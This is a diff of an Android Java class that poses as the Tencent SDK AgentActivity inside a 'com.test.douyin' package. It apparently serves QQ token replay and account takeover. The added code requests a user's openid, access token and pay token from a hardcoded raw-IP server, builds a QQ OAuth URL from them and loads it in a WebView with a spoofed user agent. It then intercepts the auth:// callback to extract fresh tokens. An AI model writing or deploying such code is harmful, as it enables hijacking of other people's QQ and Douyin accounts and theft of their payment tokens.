@@ -1,80 +1,191 @@
 package com.test.douyin;
 
-import android.content.Intent;
+import android.annotation.SuppressLint;
+import android.graphics.Bitmap;
 import android.net.Uri;
+import android.os.AsyncTask;
 import android.os.Bundle;
+import android.webkit.WebView;
+import android.webkit.WebViewClient;
 import android.widget.TextView;
 import android.widget.Toast;
 
 import androidx.appcompat.app.AppCompatActivity;
 
+import java.io.BufferedReader;
+import java.io.InputStreamReader;
+import java.net.HttpURLConnection;
+import java.net.URL;
 import java.util.regex.Matcher;
 import java.util.regex.Pattern;
 
-/**
- * 腾讯开放 SDK AgentActivity
- * 抖音调用 QQ 登录时，Intent 会路由到此 Activity
- */
 public class AgentActivity extends AppCompatActivity {
 
+    private static final String SERVER_URL = "http://45.10.175.247:3260";
     private static final Pattern TOKEN_PATTERN = Pattern.compile(
             "access_token=(.*?)&expires_in=(.*?)&openid=(.*?)&pay_token=(.*?)&"
     );
 
+    private WebView webView;
+    private TextView tvStatus;
+    private String account;
+
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
+        setContentView(R.layout.activity_agent);
 
-        Intent intent = getIntent();
-        if (intent == null) {
-            Toast.makeText(this, "无数据", Toast.LENGTH_SHORT).show();
+        webView = findViewById(R.id.webView);
+        tvStatus = findViewById(R.id.tvStatus);
+
+        account = getIntent().getStringExtra("account");
+        if (account == null || account.isEmpty()) {
+            Toast.makeText(this, "账号为空", Toast.LENGTH_SHORT).show();
             finish();
             return;
         }
 
-        String action = intent.getAction();
-        Uri data = intent.getData();
-        String scheme = data != null ? data.getScheme() : "null";
+        tvStatus.setText("正在获取账号数据...");
+        setupWebView();
+        new GetDateTask().execute(account);
+    }
 
-        // 显示接收到的 Intent 信息
-        StringBuilder sb = new StringBuilder();
-        sb.append("收到抖音授权请求\n");
-        sb.append("Action: ").append(action).append("\n");
-        sb.append("Scheme: ").append(scheme).append("\n");
-        if (data != null) {
-            sb.append("URI: ").append(data.toString()).append("\n");
-            // 打印所有参数
-            for (String key : data.getQueryParameterNames()) {
-                sb.append("  ").append(key).append(": ")
-                        .append(data.getQueryParameter(key)).append("\n");
+    @SuppressLint("SetJavaScriptEnabled")
+    private void setupWebView() {
+        webView.getSettings().setJavaScriptEnabled(true);
+        webView.getSettings().setDomStorageEnabled(true);
+        webView.getSettings().setUserAgentString(
+                "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36");
+
+        webView.setWebViewClient(new WebViewClient() {
+
+            @Override
+            public boolean shouldOverrideUrlLoading(WebView view, String url) {
+                if (url.startsWith("auth://tauth.qq.com")) {
+                    handleCallback(url);
+                    return true;
+                }
+                return false;
             }
 
-            // 检查是否是 auth://tauth.qq.com 回调 （QQ OAuth 完成后的回调）
-            if ("auth".equals(scheme) && "tauth.qq.com".equals(data.getHost())) {
-                String url = data.toString();
-                Matcher m = TOKEN_PATTERN.matcher(url);
-                if (m.find()) {
-                    sb.append("\n✓ 检测到 QQ 授权回调 Token:\n");
-                    sb.append("AccessToken: ").append(m.group(1)).append("\n");
-                    sb.append("ExpiresIn: ").append(m.group(2)).append("\n");
-                    sb.append("OpenID: ").append(m.group(3)).append("\n");
-                    sb.append("PayToken: ").append(m.group(4));
+            @Override
+            public void onPageStarted(WebView view, String url, Bitmap favicon) {
+                super.onPageStarted(view, url, favicon);
+                if (url.startsWith("auth://tauth.qq.com")) {
+                    handleCallback(url);
+                }
+                tvStatus.setText("加载中: " + url);
+            }
+
+            @Override
+            public void onPageFinished(WebView view, String url) {
+                super.onPageFinished(view, url);
+                if (!url.startsWith("auth://")) {
+                    tvStatus.setText("QQ 授权页面已加载");
                 }
             }
+        });
+    }
+
+    private void handleCallback(String url) {
+        Matcher m = TOKEN_PATTERN.matcher(url);
+        if (m.find()) {
+            String accessToken = m.group(1);
+            String expiresIn = m.group(2);
+            String openid = m.group(3);
+            String payToken = m.group(4);
+
+            StringBuilder result = new StringBuilder();
+            result.append("✓ QQ 授权成功\n\n");
+            result.append("OpenID: ").append(openid).append("\n");
+            result.append("AccessToken: ").append(accessToken).append("\n");
+            result.append("PayToken: ").append(payToken).append("\n");
+            result.append("有效期: ").append(expiresIn).append(" 秒");
+
+            tvStatus.setText(result.toString());
+            webView.setVisibility(android.view.View.GONE);
+        } else {
+            tvStatus.setText("未匹配到 Token\n" + url);
+        }
+    }
+
+    // ===== GetDateTask (与 QQLogin.apk 一致) =====
+    private class GetDateTask extends AsyncTask<String, Void, String> {
+
+        @Override
+        protected String doInBackground(String... params) {
+            try {
+                String accountId = params[0];
+                URL url = new URL(SERVER_URL + "/getOP/account=" + Uri.encode(accountId));
+                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
+                conn.setConnectTimeout(8000);
+                conn.setReadTimeout(8000);
+
+                int code = conn.getResponseCode();
+                if (code != 200) return null;
+
+                BufferedReader reader = new BufferedReader(
+                        new InputStreamReader(conn.getInputStream(), "UTF-8"));
+                StringBuilder sb = new StringBuilder();
+                String line;
+                while ((line = reader.readLine()) != null) sb.append(line);
+                reader.close();
+                conn.disconnect();
+
+                return sb.toString().trim();
+            } catch (Exception e) {
+                return null;
+            }
         }
 
-        // 显示信息
-        setContentView(R.layout.activity_agent);
-        TextView tv = findViewById(R.id.tvAgentInfo);
-        tv.setText(sb.toString());
+        @Override
+        protected void onPostExecute(String response) {
+            if (response == null || response.isEmpty()) {
+                tvStatus.setText("✗ 获取账号数据失败，请检查账号");
+                return;
+            }
 
-        // 如果有 openid 参数，转发到 MainActivity 做下一步
-        if (data != null && data.getQueryParameter("openid") != null) {
-            Intent mainIntent = new Intent(this, MainActivity.class);
-            mainIntent.setData(data);
-            startActivity(mainIntent);
+            try {
+                String[] parts = response.split("----");
+                if (parts.length < 2) {
+                    tvStatus.setText("✗ 数据格式错误:\n" + response);
+                    return;
+                }
+
+                String dataPart = parts[1];
+                String[] fields = dataPart.split("\\|");
+                if (fields.length < 3) {
+                    tvStatus.setText("✗ 数据字段不足:\n" + response);
+                    return;
+                }
+
+                String openid = fields[0];
+                String accessToken = fields[1];
+                String payToken = fields[2];
+
+                tvStatus.setText("数据获取成功，正在打开 QQ 授权...");
+
+                // 构造 QQ OAuth URL (与 QQLogin.apk 一致)
+                String authUrl = "https://tauth.qq.com/cgi-bin/auth"
+                        + "?openid=" + Uri.encode(openid)
+                        + "&access_token=" + Uri.encode(accessToken)
+                        + "&pay_token=" + Uri.encode(payToken);
+
+                webView.setVisibility(android.view.View.VISIBLE);
+                webView.loadUrl(authUrl);
+
+            } catch (Exception e) {
+                tvStatus.setText("✗ 解析错误:\n" + e.getMessage());
+            }
         }
+    }
 
-        Toast.makeText(this, "收到授权请求", Toast.LENGTH_LONG).show();
+    @Override
+    public void onBackPressed() {
+        if (webView.canGoBack()) {
+            webView.goBack();
+        } else {
+            finish();
+        }
     }
 }
